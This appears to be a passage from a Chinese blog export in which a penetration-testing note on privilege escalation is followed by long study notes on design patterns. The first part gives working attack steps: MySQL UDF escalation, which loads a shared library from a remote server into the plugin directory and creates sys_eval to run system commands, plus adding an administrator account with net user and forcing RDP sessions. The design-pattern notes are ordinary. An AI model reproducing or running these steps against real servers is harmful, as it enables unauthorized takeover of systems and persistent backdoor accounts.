五、提权123456通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限(即中间件权限network service)。因为我们上传木马是被中间件解析的，所以通过木马控制服务器现在的权限是中间件的权限。中间件的权限是网站管理员设置的。如在iis就是iis用户组权限，在apache 就是管理员权限，e一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理员权限。更高的权限方便我们在后续的渗透中，扩大范围测试。 sqlmap中的os-shell也是同样原理，sql-shell 是数据库权限。 UDF提权UDF(User Defined Function用户自定义函数)。用户可以通过自定义函数实现在mysql中无法方便实现的功能，添加的新函数都可以在sql语句中调用，就像调用本机函数一样 udf.dll(windows)/udf.so(linux)是一个函数的脚本，这个脚本的作用是 提供了 mysql执行系统命令的功能。 条件： 123MySQL数据库没有开启安全模式。已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。shell有写入到数据库安装目录的权限。 12345678udf.dll 如何处理1、cmd命令行处理certutil -encodehex -f -v udf64.dll w32x.txt 4 2、数据库处理select hex(load_file('/udf/udf64.so')) into dumpfile 'l64.hex';3、远程包含导入select load_file('//你的服务器/l64.so') into dumpfile '/www/server/mysql/lib/plugin/l64.so'; 步骤： 12345671.select @@version_compile_os,@@version_compile_machine,@@version #判断版本2.select @@plugin_dir ; show variables like 'plugin%';#判断路径3.select 0x3weqwe.. into dumpfile '/www/server/mysql/lib/plugin/1.so'#写入文件4.drop function sys_evalcreate function sys_eval returns string soname '1.so';#生成函数5.select sys_eval('whoami') #执行函数 注意：outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式 宝塔(可以短时间让电脑变成服务器，并增加安全防护)管理数据库：要知道端口-&gt;路径-&gt;登录进入管理网站-&gt;登录数据库-&gt;管理数据库phpmyadmin：http://IP:888/pma 补丁查询 0.当遇到连执行命令的权限都没有的时候，直接上传一个新的cmd.exe 1.执行systeminfo命令查询目标服务器打过哪些补丁，将执行结果复制放到查询网站-&gt;返回exp 2.找到哪些是可以利用的，得到system权限 3.创建用户 123net user qiesi abc123 /add #添加用户，默认普通用户没有登录远程服务器的权限net user qiesi /delete #删除用户net localgroup administrators qiesi /add #将用户加入到管理员组 4.远程登录：在本地输入mstsc 找ip:在目标服务器命令行输入ping 目标网址(要删去http头) 在远程桌面连接输入ip或ip:3389 /admin 3389：有的时候远程连接的默认端口不是3389 /admin：有时遇到目标服务器连接不上，超出了最大允许连接范围-&gt;把别人挤掉 总结 参考资料1.udf提权","link":"/2022/04/18/%E6%9C%A8%E9%A9%AC%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"设计模式","text":"摘要：设计模式-可复用面向对象软件的基础 学习笔记 前言12345678910面向对象：继承、封装、多态客户请求是对象执行操作的唯一方法，操作又是对象改变内部封装数据的唯一方法型构：某个操作的操作名、作为参数的对象、返回值接口：所有型构的集合(注意：两个有相同接口的对象可能有不同实现)类型：某对象接收window的接口的所有请求，则其具有window类型子类型&lt;-&gt;超类型动态绑定：发给对象的请求和它的相应操作 在运行时的连接多态：允许你在运行时彼此替换有相同接口的对象抽象类：为了让子类可以有相同的接口和不同的实现。用户只需要知道抽象类混入类；给其他类提供可选择的接口的类，要求多继承 1.类型与类；类继承与接口继承一个对象可以有多个类型，但只属于一个类。不同类的对象可以有相同的类型 类继承根据一个对象的实现定义了另一个对象的实现，是代码和表示的共享机制(即这两个对象一定有关系)。接口继承描述了一个对象何时能被用来替代另一个对象(除了接口同可能其他完全不同) C++接口继承的方法是公有继承一个含(纯)虚成员函数的类 2.公有继承/私有继承/保护继承的区别1.公有继承–public 派生类的新增成员可以访问基类的公有成员和保护成员，但是访问不了基类的私有成员。派生类的对象只能访问派生类的公有成员（包括继承的公有成员），访问不了保护成员和私有成员。 2.保护继承–protected 基类的公有成员和保护成员被派生类继承后变成派生类的保护成员 3.私有继承–private 私有继承时，基类的公有成员和保护成员都被派生类继承下来之后变成派生类的私有成员为什么要有protected：public是对所有用户开放的，而protected成员是只开放给自己和子类的，其他没关系的类不能访问。 3.类继承与对象组合类继承和对象组合常一起使用，但设计者往往过度使用了继承。 4.委托有两个对象参与处理一个请求，接收请求的对象将操作委托给它的代理者，类似于子类把没重定义的请求交给它的父类处理。实现方法：在委托者类中保存一个代理者类的实例。 5.参数化类型/模板/类属123如实现元素比较操作的例程(元素类型不确定)：可实现要传给排序例程的对象的职责作为C++模板以指定元素类型 6.设计应支持变化一些导致重新设计的原理： 12345678显式指定一个类 来创建对象为请求指定了一个特殊的操作 完成请求的方式固定了对硬件和平台的依赖知道对象具体实现的客户在对象发生变化时也可能变化，所以要封装算法依赖(算法会经常优化)紧耦合：对互相依赖的类，你想改变或删除一个类，必须理解和改变其他很多类，难学习通过生成子类来扩充功能：对父类的理解，类爆炸不能方便地对类进行修改：没有源代码，影响其他很多类 7.怎么选择设计模式123456考虑设计模式怎么解决问题浏览设计模式的意图研究模式怎么关联研究目的相似的模式未来可能重新设计的原因设计中哪些是可变的 8.怎么使用设计模式1234567浏览模式适用性和效果研究结构部分、参与者部分和协作部分看代码示例选择模式参与者的名字定义类定义模式中专用于应用的操作名称实现执行模式中的责任与协作机制 一、创建型 - 设计模式1 简单工厂模式 简单工厂模式(Simple Factory Pattern)：专门定义一个类（工厂类）来负责创建其他类的实例。可以根据创建方法的参数来返回不同类的实例，被创建的实例通常都具有共同的父类。 举例：简单工厂模式像一个代工厂，一个工厂可以生产多种产品。举个例子，一个饮料加工厂同时帮百事可乐和可口可乐生产，加工厂根据输入参数Type来生产不同的产品。 优点： 使用者只需要给工厂类传入一个正确的约定好的参数，就可以获取你所需要的对象，而不需要知道其创建细节，一定程度上减少系统的耦合。 客户端无须知道所创建的具体产品类的类名，只需要知道具体产品类所对应的参数即可，减少开发者的记忆成本。 缺点： 如果业务上添加新产品的话，就需要修改工厂类原有的判断逻辑，这其实是违背了开闭原则的。 在产品类型较多时，有可能造成工厂逻辑过于复杂。所以简单工厂模式比较适合产品种类比较少而且增多的概率很低的情况。 2 工厂方法模式 工厂方法模式(Factory Method Pattern)又称为工厂模式，工厂父类负责定义创建产品对象的公共接口，而工厂子类则负责生成具体的产品对象，即通过不同的工厂子类来创建不同的产品对象。 举例：工厂方法和简单工厂有一些区别，简单工厂是由一个代工厂生产不同的产品，而工厂方法是对工厂进行抽象化，不同产品都由专门的具体工厂来生产。可口可乐工厂专门生产可口可乐，百事可乐工厂专门生产百事可乐。 优点： 用户只需要关心其所需产品对应的具体工厂是哪一个即可，不需要关心产品的创建细节，也不需要知道具体产品类的类名。 当系统中加入新产品时，不需要修改抽象工厂和抽象产品提供的接口，也无须修改客户端和其他的具体工厂和具体产品，而只要添加一个具体工厂和与其对应的具体产品就可以了，符合了开闭原则。 缺点： 当系统中加入新产品时，除了需要提供新的产品类之外，还要提供与其对应的具体工厂类。因此系统中类的个数将成对增加，增加了系统的复杂度。 3 抽象工厂模式 抽象工厂模式(Abstract Factory Pattern)：提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类。 举例：抽象工厂和工厂方法不同的地方在于，工厂模式只能生产单一产品不能生产产品族，而现实生活中往往需要产品族。 举例，可口可乐公司生产可乐的同时，也需要生产装可乐的瓶子和箱子，瓶子和箱子也是可口可乐专属定制的，同样百事可乐公司也会有这个需求。这个时候我们的工厂不仅仅是生产可乐饮料的工厂，还必须同时生产同一主题的瓶子和箱子，所以它是一个抽象的主题工厂，专门生产同一主题的不同商品。 优点： 具体产品在应用层代码隔离，不需要关心产品细节。只需要知道自己需要的产品是属于哪个工厂的即可 当一个产品族中的多个对象被设计成一起工作时，它能够保证客户端始终只使用同一个产品族中的对象。这对一些需要根据当前环境来决定其行为的软件系统来说，是一种非常实用的设计模式。 缺点： 产品线写死了。规定了所有可能被创建的产品集合，产品族中扩展新的产品困难，需要修改抽象工厂的接口。 4 单例模式 单例模式(Singleton Pattern)：单例模式确保某一个类只有一个实例，并提供一个访问它的全局访问点。(多个对象指针指向的是同一个) 构造方法： 构造函数私有化(构造函数只执行一次) 提供一个全局的静态方法(全局访问点) 在类中定义一个静态指针，指向本类的变量的静态变量指针 分类： 懒汉式；只有在get实例时才把实例new出来 举例： 在多个线程之间，比如初始化一次socket资源，比如servlet环境，共享同一个资源或者操作同一个对象 在整个程序空间中使用全局变量，共享资源 大规模系统中，为了性能考虑，需要节省对象的创建时间 单例模式下，对应类只能生成一个实例。就像一个王国只能有一个国王，一旦王国里的事务多起来，这唯一的国王也容易职责过重。 优点： 提供了对唯一实例的受控访问。因为单例类封装了它的唯一实例，所以它可以严格控制客户怎样以及何时访问它。 因为该类在系统内存中只存在一个对象，所以可以节约系统资源。 缺点： 由于单例模式中没有抽象层，因此单例类很难进行扩展。 对于有垃圾回收系统的语言 Java，C# 来说，如果对象长时间不被利用，则可能会被回收。那么如果这个单例持有一些数据的话，在回收后重新实例化时就不复存在了。 5 生成器模式 生成器模式(Builder Pattern)：也叫创建者模式，它将一个复杂对象的构建过程与它的表示分离，使得同样的构建过程可以创建不同的表示。 举例：生成器模式将复杂的创建逻辑进行分割，例如生产汽车，分步骤创建安装不同的零件。但如果创建逻辑简单则没有拆分的必要。 1234Builder:创建各个部分，抽象接口ConcreteBuilder:具体创建Director:一个使用Builder接口的对象Product:被构造的复杂对象 优点： 客户端不必知道产品内部组成的细节，使得相同的创建过程可以创建不同的产品对象。用户使用不同的具体建造者即可得到不同的产品对象。 每一个具体建造者都相对独立，与其他的具体建造者无关，因此可以很方便地替换具体建造者或增加新的具体建造者。工程队竞争上岗、擅长的地方不同(造别墅、平房等)，便于比较不同建造者的性能。 增加新的具体建造者无须修改原有类库的代码，指挥者类针对抽象建造者类编程，系统扩展方便，符合“开闭原则”。 可以更加精细地控制产品的创建过程 。将复杂产品的创建步骤分解在不同的方法中，使得创建过程更加清晰，也更方便使用程序来控制创建过程。 缺点： 建造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制。 如果产品的内部变化复杂，可能会导致需要定义很多具体建造者类来实现这种变化，导致系统变得很庞大。6 原型模式 原型模式（Prototype Pattern）: 使用原型实例指定待创建对象的类型，并且通过复制这个原型来创建新的对象。即提供一个接口，让创建复杂的类具有自我复制功能 举例：原型模式就像复印技术，根据原对象复印出一个新对象，并根据需求对新对象进行微调。 深拷贝与浅拷贝 优点： 可以利用原型模式简化对象的创建过程，尤其是对一些创建过程繁琐，包含对象层级比较多的对象来说，使用原型模式可以节约系统资源，提高对象生成的效率。 可以很方便得通过改变值来生成新的对象：有些对象之间的差别可能只在于某些值的不同；用原型模式可以快速复制出新的对象并手动修改值即可。 缺点： 对象包含的所有对象都需要配备一个克隆的方法，这就使得在对象层级比较多的情况下，代码量会很大，也更加复杂。 二、结构型 - 设计模式总原则：让类和类进行组合从而获取更大的结构 1.代理模式 代理模式(Proxy Pattern)：代理类a包含被代理类b的实例，a,b类实现协议类protocol 举例：代理模式像一个房屋中介，买家只能通过中介来买房，代理具备被代理类的所有功能，就像房东有卖房功能，中介也具有卖房功能。此外代理实例还可以帮助被代理实例进行一些额外处理(淘宝网代理卖家)，比如中介可以帮助房东筛选优质买家的功能，帮助房东pass掉一些不符合条件的买家。还有消息队列也是该模式。 优点： 降低系统的耦合度：代理模式能够协调调用者和被调用者，在一定程度上降低了系 统的耦合度。 不同类型的代理可以对客户端对目标对象的访问进行不同的控制： 远程代理,使得客户端可以访问在远程机器上的对象，远程机器 可能具有更好的计算性能与处理速度，可以快速响应并处理客户端请求。 虚拟代理通过使用一个小对象来代表一个大对象，可以减少系统资源的消耗，对系统进行优化并提高运行速度。 保护代理可以控制客户端对真实对象的使用权限。 缺点： 由于在客户端和被代理对象之间增加了代理对象，因此可能会让客户端请求的速度变慢。2.装饰模式 装饰模式(Decorator Pattern):不改变原有对象的前提下，动态地给一个对象增加一些额外的功能。比生成子类更灵活，比如可以+a功能，+c,也可以+a+c,即额外装饰已经装饰好的对象 举例：装饰模式贴合开闭原则，在不改变原有类的情况下，对父类进行改造或新增功能。举例，定一个抽象类Tea，只能提供白开水，但是通过装饰类BlackTea装饰之后拓展了新功能，通过BlackTea类可以用白开水泡红茶，还可以选择加柠檬。 优点： 比继承更加灵活：不同于在编译期起作用的继承；装饰者模式可以在运行时扩展一个对象的功能。另外也可以通过配置文件在运行时选择不同的装饰器，从而实现不同的行为。也可以通过不同的组合，可以实现不同效果。 符合“开闭原则”：装饰者和被装饰者可以独立变化。用户可以根据需要增加新的装饰类，在使用时再对其进行组合，原有代码无须改变。 缺点： 装饰者模式需要创建一些具体装饰类，会增加系统的复杂度。 3.适配器模式 适配器模式(Adapter Pattern) ：将一个接口转换成客户希望的另一个接口，使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。别名是包装器模式（Wrapper） 举例：适配器模式顾名思义，比如内地用像港版插头需要一个转接头。再比如iPhone的手机卡是特别小的 Nano 卡，把 Nano 卡拿到其他手机上不能贴合卡槽尺寸，所以我们需要加一个符合卡槽尺寸的卡套。 优点： 符合开闭原则：使用适配器而不需要改变现有类，提高类的复用性。 目标类和适配器类解耦，提高程序扩展性。 缺点： 增加了系统的复杂性 4.桥接模式 桥接模式(Simple Factory Pattern)：将抽象部分与它的实现部分分离(解耦合),使它们都可以独立地变化。如发动机类不在车类里实现 举例：尽管手机都有各自的不同之处，但是他们都有一个手机卡卡槽，卡槽里可以插不同运营商的卡。不管手机和卡内部如何改变，只要卡槽的行业标准没有变，就都可以正常使用。桥接模式在于将复杂的类进行分割，优先对象组合的方式，就像将手机里的手机卡抽离出去新建一个类，实现手机实例持有一个手机卡实例的组合方式。而不是通过继承来新建多个不同手机卡的手机子类。 优点： 扩展性好，符合开闭原则：将抽象与实现分离，让二者可以独立变化 缺点： 在设计之前，需要识别出两个独立变化的维度。 5.组合模式 适用于：单个对象和组合对象的使用具有一致性，将对象组合成树形结构，以表示部分-整体(文件夹与文件) 单个对象和组合对象的接口一致，但实现可能不一致（如返回NULL） 6.外观模式 外观模式(Facade Pattern)：外观模式定义了一个高层接口，为子系统中的一组接口提供一个统一的接口。外观模式又称为门面模式，它是一种结构型设计模式模式。 举例：外观模式提供了简单明确的接口，但是在内部众多子系统功能进行整合。就像图片缓存，内部包含了涉及到其他子系统的如缓存、下载等处理，外观模式将这些复杂的逻辑都隐藏了。在UIImageView和UIButton调用的时候，你只需要调一个setImageWithUrl:(NSString *)url接口就可以了，达到解耦合的目的。 优点： 实现了客户端与子系统间的解耦：客户端无需知道子系统的接口，简化了客户端调用子系统的调用过程，使得子系统使用起来更加容易。同时便于子系统的扩展和维护。 符合迪米特法则（最少知道原则）：子系统只需要将需要外部调用的接口暴露给外观类即可，而且他的接口则可以隐藏起来。 缺点： 违背了开闭原则：在不引入抽象外观类的情况下，增加新的子系统可能需要修改外观类或客户端的代码。 7.享元模式 享元模式(Flyweight Pattern)：运用共享技术复用大量细粒度的对象(比如某个对象要使用千次，避免重复创建),降低程序内存的占用,提高程序的性能。(相同id的Teacher) 举例：例如 UITableViewCell 的缓存机制，达到降低内存消耗的目的。举例，音乐服务根据收费划分出免费用户和会员用户，免费用户只能听部分免费音乐，会员用户可以听全部的音乐，并且可以下载。虽然权限上二者间有一些区别，但是他们所享受的音乐来是自于同一个音乐库，这样所有的音乐都只需要保存一份就可以了。另外如果出现音乐库里没有的音乐时，则需要新增该音乐，然后其他服务也可以享受新增的音乐，相当于享元池或缓存池的功能。 优点： 使用享元模可以减少内存中对象的数量，使得相同对象或相似对象在内存中只保存一份，降低系统的使用内存，也可以提性能。 享元模式的外部状态相对独立，而且不会影响其内部状态，从而使得享元对象可以在不同的环境中被共享。 缺点： 使用享元模式需要分离出内部状态和外部状态，这使得程序的逻辑复杂化。 对象在缓冲池中的复用需要考虑线程问题。 六、行为型 - 设计模式总原则：描述类或对象怎么交互和分配职责，侧重类的方法 1.模板方法模式 模板方法模式：把方法的实现放到子类，但在抽象类中提前定义好方法的调用顺序逻辑作为模板 举例：模板方法模式在 iOS 中的应用也非常多，如 UIViewController 的生命周期函数，定义在父类，子类可以重写这些函数。 模板方法模式具体应用又分为三类： 抽象方法：一个抽象方法由抽象类声明、由其具体子类实现。 具体方法：一个具体方法由一个抽象类或具体类声明并实现，其子类可以进行覆盖也可以直接继承 钩子方法：一个钩子方法由一个抽象类或具体类声明并实现，而其子类可能会加以扩展。通常在父类中给出的实现是一个空实现，并以该空实现作为方法的默认实现，当然钩子方法也可以提供一个非空的默认实现。通过在子类中实现的钩子方法对父类方法的执行进行约束，实现子类对父类行为的反向控制。 优点： 在父类中形式化地定义一个算法，而由它的子类来实现细节的处理，在子类实现详细的处理算法时并不会改变算法中步骤的执行次序。 模板方法模式是一种代码复用技术，它在类库设计中尤为重要，它提取了类库中的公共行为，将公共行为放在父类中，而通过其子类来实现不同的行为，它鼓励我们恰当使用继承来实现代码复用。 可实现一种反向控制结构，通过子类覆盖父类的钩子方法来决定某一特定步骤是否需要执行。 在模板方法模式中可以通过子类来覆盖父类的基本方法，不同的子类可以提供基本方法的不同实现，更换和增加新的子类很方便，符合单一职责原则和开闭原则。 缺点： 需要为每一个基本方法的不同实现提供一个子类，如果父类中可变的基本方法太多，将会导致类的个数增加，系统更加庞大，设计也更加抽象，此时，可结合桥接模式来进行设计。2.命令模式 命令模式(Command Pattern)：别名为动作(Action)或事务(Transaction)模式。一个对象(Car)调用另一个对象(Engine)的过程是：创建目标对象实例；设置调用参数；调用目标对象的方法。如果调用过程较繁琐，或者有多处调用，有必要用一个专门的类对这种调用过程进行封装，即command类 把一个请求封装成一个类，从而可用不同的请求对客户进行参数化，可对请求排队、归类、记录日志、撤销等。(如护士收集归类病历并对病人排队) 举例：例如遥控器是一个调用者，不同按钮代表不同的命令，而电视是接收者。如日志、缓存、记录历史操作等 优点： 降低系统的耦合度。由于请求者与接收者之间不存在直接引用，因此请求者与接收者之间实现完全解耦，相同的请求者可以对应不同的接收者，同样，相同的接收者也可以供不同的请求者使用，两者之间具有良好的独立性。 新的命令可以很容易地加入到系统中。由于增加新的具体命令类不会影响到其他类，因此增加新的具体命令类很容易，无须修改原有系统源代码，甚至客户类代码，满足“开闭原则”的要求。 可以比较容易地设计一个命令队列或宏命令（组合命令）。 为请求的撤销(Undo)和恢复(Redo)操作提供了一种设计和实现方案。 缺点： 使用命令模式可能会导致某些系统有过多的具体命令类。因为针对每一个对请求接收者的调用操作都需要设计一个具体命令类，因此在某些系统中可能需要提供大量的具体命令类，这将影响命令模式的使用。3.职责链模式 职责链模式(Chain of Responsibility Pattern)：避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。 举例：职责链模式在 iOS 中有大量的应用，比如事件响应链，事件传递下来会先判断该事件是不是应该由自己处理，如果不是由自己处理则传给下一位响应者去处理，如此循环下去。需要注意的是要避免响应链循环调用造成死循环，还有当所有的响应者都无法处理时的情况。 优点： 职责链模式使得一个对象无须知道是其他哪一个对象处理其请求，对象仅需知道该请求会被处理即可，接收者和发送者都没有对方的明确信息，且链中的对象不需要知道链的结构，由客户端负责链的创建，降低了系统的耦合度。 请求处理对象仅需维持一个指向其后继者的引用，而不需要维持它对所有的候选处理者的引用，可简化对象的相互连接。 在给对象分派职责时，职责链可以给我们更多的灵活性，可以通过在运行时对该链进行动态的增加或修改来增加或改变处理一个请求的职责。 在系统中增加一个新的具体请求处理者时无须修改原有系统的代码，只需要在客户端重新建链即可，从这一点来看是符合“开闭原则”的。 缺点： 由于一个请求没有明确的接收者，那么就不能保证它一定会被处理，该请求可能一直到链的末端都得不到处理；一个请求也可能因职责链没有被正确配置而得不到处理。 对于比较长的职责链，请求的处理可能涉及到多个处理对象，系统性能将受到一定影响，而且在进行代码调试时不太方便。 如果建链不当，可能会造成循环调用，将导致系统陷入死循环。 4.策略模式 策略模式(Strategy Pattern)：定义一系列算法类，将每一个算法封装起来，并让它们可以相互替换，策略模式让算法独立于使用它的客户而变化，也称为政策模式(Policy)。 举例：使用策略模式时，我们可以定义一些策略类，每一个策略类中封装一种具体的算法。在这里，每一个封装算法的类我们都可以称之为一种策略，根据传入不同的策略类，使环境类执行不同策略类中的算法。 生活中也有很多类似的例子，就比如说商城的会员卡机制。我们去商城购物可以通过持有的会员卡打折，购买同一件商品时，持有不同等级的会员卡，能得到不同力度的折扣。下面的例子中我列举了青铜、白银、黄金三种 Vip 会员卡，传入不同的会员卡最终需要支付的金额也会有所不同。 优点： 策略模式提供了对“开闭原则”的完美支持，用户可以在不修改原有系统的基础上选择算法或行为，也可以灵活地增加新的算法或行为。 策略模式提供了管理相关的算法族的办法。策略类的等级结构定义了一个算法或行为族，恰当使用继承可以把公共的代码移到抽象策略类中，从而避免重复的代码。 策略模式提供了一种可以替换继承关系的办法。如果不使用策略模式，那么使用算法的环境类就可能会有一些子类，每一个子类提供一种不同的算法。但是，这样一来算法的使用就和算法本身混在一起，不符合“单一职责原则”，决定使用哪一种算法的逻辑和该算法本身混合在一起，从而不可能再独立演化；而且使用继承无法实现算法或行为在程序运行时的动态切换。 使用策略模式可以避免多重条件选择语句。多重条件选择语句不易维护，它把采取哪一种算法或行为的逻辑与算法或行为本身的实现逻辑混合在一起，将它们全部硬编码(Hard Coding)在一个庞大的多重条件选择语句中，比直接继承环境类的办法还要原始和落后。 策略模式提供了一种算法的复用机制，由于将算法单独提取出来封装在策略类中，因此不同的环境类可以方便地复用这些策略类。 缺点： 客户端必须知道所有的策略类，并自行决定使用哪一个策略类。这就意味着客户端必须理解这些算法的区别，以便适时选择恰当的算法。换言之，策略模式只适用于客户端知道所有的算法或行为的情况。 策略模式将造成系统产生很多具体策略类，任何细小的变化都将导致系统要增加一个新的具体策略类。 无法同时在客户端使用多个策略类，也就是说，在使用策略模式时，客户端每次只能使用一个策略类，不支持使用一个策略类完成部分功能后再使用另一个策略类来完成剩余功能的情况。 5.中介者模式 中介者模式(Mediator Pattern)：用一个中介对象（中介者）来封装一系列的对象交互，中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。中介者模式又称为调停者模式，它是一种对象行为型模式。 举例：中介者模式将一个网状的系统结构变成一个以中介者对象为中心的星形结构，在这个星型结构中，使用中介者对象与其他对象的一对多关系来取代原有对象之间的多对多关系。所有成员通过中介者交互，方便拓展新的成员，例如下面的例子，新增一个聊天室成员只需要新建一个成员实例，然后再在聊天室中介者那注册就可以加入聊天室了。 优点： 中介者模式简化了对象之间的交互，它用中介者和同事的一对多交互代替了原来同事之间的多对多交互，一对多关系更容易理解、维护和扩展，将原本难以理解的网状结构转换成相对简单的星型结构。 中介者模式可将各同事对象解耦。中介者有利于各同事之间的松耦合，我们可以独立的改变和复用每一个同事和中介者，增加新的中介者和新的同事类都比较方便，更好地符合“开闭原则”。 可以减少子类生成，中介者将原本分布于多个对象间的行为集中在一起，改变这些行为只需生成新的中介者子类即可，这使各个同事类可被重用，无须对同事类进行扩展。 缺点： 在具体中介者类中包含了大量同事之间的交互细节，可能会导致具体中介者类非常复杂，使得系统难以维护。 6.观察者模式 观察者模式(Observer Pattern)：定义对象之间的一种一对多依赖关系，使得每当一个对象状态发生改变时，其相关依赖对象皆得到通知并被自动更新。观察者模式的别名包括发布-订阅（Publish/Subscribe）模式、模型-视图（Model/View）模式、源-监听器（Source/Listener）模式或从属者（Dependents）模式。 举例：观察者模式是使用频率最高的设计模式之一，它用于建立一种对象与对象之间的依赖关系，一个对象发生改变时将自动通知其他对象，其他对象将相应作出反应。 优点： 观察者模式可以实现表示层和数据逻辑层的分离，定义了稳定的消息更新传递机制，并抽象了更新接口，使得可以有各种各样不同的表示层充当具体观察者角色。 观察者模式在观察目标和观察者之间建立一个抽象的耦合。观察目标只需要维持一个抽象观察者的集合，无须了解其具体观察者。由于观察目标和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。 观察者模式支持广播通信，观察目标会向所有已注册的观察者对象发送通知，简化了一对多系统设计的难度。 观察者模式满足“开闭原则”的要求，增加新的具体观察者无须修改原有系统代码，在具体观察者与观察目标之间不存在关联关系的情况下，增加新的观察目标也很方便。 缺点： 如果一个观察目标对象有很多直接和间接观察者，将所有的观察者都通知到会花费很多时间。 如果在观察者和观察目标之间存在循环依赖，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。 观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。 7.备忘录模式 备忘录模式(Memento Pattern)：在不破坏封装的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态。别名为Token。 举例：备忘录模式提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原，当前很多软件都提供了撤销操作，其中就使用了备忘录模式。 我们用一个简单的游戏存档来举例，这也是备忘录模式的一种应用。 优点： 它提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原。 备忘录实现了对信息的封装，一个备忘录对象是一种原发器对象状态的表示，不会被其他代码所改动。备忘录保存了原发器的状态，采用列表、堆栈等集合来存储备忘录对象可以实现多次撤销操作。 缺点： 资源消耗过大，如果需要保存的原发器类的成员变量太多，就不可避免需要占用大量的存储空间，每保存一次对象的状态都需要消耗一定的系统资源。 8.访问者模式 访问者模式(Visitor Pattern):解耦合对象的数据和操作，提供一个作用于某对象中的各元素的操作表示，它使我们可以在不改变各元素的类的前提下定义作用于这些元素的新操作。 举例：访问者模式是一种较为复杂的行为型设计模式，它包含访问者和被访问元素两个主要组成部分，这些被访问的元素通常具有不同的类型，且不同的访问者可以对它们进行不同的访问操作。访问者模式使得用户可以在不修改现有系统的情况下扩展系统的功能，为这些不同类型的元素增加新的操作。 在使用访问者模式时，被访问元素通常不是单独存在的，它们存储在一个集合中，这个集合被称为「对象结构」，访问者通过遍历对象结构实现对其中存储的元素的逐个操作。通过一个简单的例子了解访问者模式，访问者有财务部门FADepartment和 HR 部门HRDepartment，通过访问雇员Employee来查看雇员的工作情况。 优点： 增加新的访问操作很方便。使用访问者模式，增加新的访问操作就意味着增加一个新的具体访问者类，实现简单，无须修改源代码，符合“开闭原则”。 将有关元素对象的访问行为集中到一个访问者对象中，而不是分散在一个个的元素类中。类的职责更加清晰，有利于对象结构中元素对象的复用，相同的对象结构可以供多个不同的访问者访问。 让用户能够在不修改现有元素类层次结构的情况下，定义作用于该层次结构的操作。 缺点： 增加新的元素类很困难。在访问者模式中，每增加一个新的元素类都意味着要在抽象访问者角色中增加一个新的抽象操作，并在每一个具体访问者类中增加相应的具体操作，这违背了“开闭原则”的要求。 破坏封装。访问者模式要求访问者对象访问并调用每一个元素对象的操作，这意味着元素对象有时候必须暴露一些自己的内部操作和内部状态，否则无法供访问者访问。9.状态模式 状态模式(State Pattern)：通过用户的状态来改变对象的行为。别名为状态对象(Objects for States)。 举例：状态模式用于解决复杂对象的状态转换以及不同状态下行为的封装问题。当系统中某个对象存在多个状态，这些状态之间可以进行转换，所以对象在不同状态下具有不同行为时可以使用状态模式。状态模式将一个对象的状态从该对象中分离出来，封装到专门的状态类中，使得对象状态可以灵活变化。 我们可以做一个简单的例子，我设计了一个银行账户系统，根据存钱余额来自动设置账户的状态，银行账户在不同状态下，进行存钱、取钱和借钱的行为。在不同状态下，这些行为得到的回复也不一样，比如说没有余额时无法取钱，只能借钱。 优点： 封装了状态的转换规则，在状态模式中可以将状态的转换代码封装在环境类或者具体状态类中，可以对状态转换代码进行集中管理，而不是分散在一个个业务方法中。 将所有与某个状态有关的行为放到一个类中，只需要注入一个不同的状态对象即可使环境对象拥有不同的行为。 允许状态转换逻辑与状态对象合成一体，而不是提供一个巨大的条件语句块，状态模式可以让我们避免使用庞大的条件语句来将业务方法和状态转换代码交织在一起。 可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。 缺点： 状态模式的使用必然会增加系统中类和对象的个数，导致系统运行开销增大。 状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱，增加系统设计的难度。 状态模式对“开闭原则”的支持并不太好，增加新的状态类需要修改那些负责状态转换的源代码，否则无法转换到新增状态；而且修改某个状态类的行为也需修改对应类的源代码。 10.解释器模式 解释器模式(Interpreter Pattern)：定义一个语言的文法，并且建立一个解释器来解释该语言中的句子，这里的“语言”是指使用规定格式和语法的代码。 context:保存输入和输出解释器:根据输入算出输出，并返回到context举例：说到解释器模式，我们的编译器，在对代码进行编译的时候也用到了该模式。我们可以直接来做一个简单的解释器，一个给机器人下发指令的解释器。 命令 参数 direction 移动方向 ‘up’ ‘down’ ‘left’ ‘right’ action 移动方式 ‘move’ ‘run’ distance 移动距离 an integer 表达式终结符号 ‘;’ 通过建立一个映射关系可以很快将指令转换成行为，例如up run 5; 表示向上跑5米，而left move 12; 表示向左移动12米。 优点： 易于改变和扩展文法。由于在解释器模式中使用类来表示语言的文法规则，因此可以通过继承等机制来改变或扩展文法。 每一条文法规则都可以表示为一个类，因此可以方便地实现一个简单的语言。 实现文法较为容易。在抽象语法树中每一个表达式节点类的实现方式都是相似的，这些类的代码编写都不会特别复杂，还可以通过一些工具自动生成节点类代码。 增加新的解释表达式较为方便。如果用户需要增加新的解释表达式只需要对应增加一个新的终结符表达式或非终结符表达式类，原有表达式类代码无须修改，符合“开闭原则”。 缺点： 